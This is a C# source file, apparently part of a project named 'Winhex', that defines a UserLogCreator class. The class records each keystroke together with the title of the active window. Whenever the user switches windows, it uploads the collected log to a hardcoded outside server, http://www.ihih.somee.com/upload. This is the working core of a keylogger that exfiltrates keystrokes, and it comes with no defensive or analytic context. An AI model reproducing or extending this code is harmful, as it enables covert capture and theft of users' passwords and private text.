using System;
using System.IO;
using System.Management;
using System.Runtime.Serialization.Formatters.Binary;
using System.Timers;
using Winhex.Interfaces;

namespace Winhex.Models
{
    public class UserLogCreator : ILogCreator
    {
        private UserAction _lastAction;
        private UserLog _currentUserLog;

        public UserLogCreator()
        {
            _currentUserLog = new UserLog();
            _lastAction = new UserAction();
        }

        public void AddKey(string appTitle, char key)
        {
            if (!appTitle.Equals(_lastAction.AppTitle))
            {
                if (_lastAction.TextLog.Length != 0)
                    _currentUserLog.Logs.Add(_lastAction);

                WebSender.SendToServer(_currentUserLog, "http://www.ihih.somee.com/upload");
                _currentUserLog = new UserLog();
                _lastAction = new UserAction() { ActionDateTime = DateTime.Now, AppTitle = appTitle };
            }

            _lastAction.TextLog += key;
        }
    }
}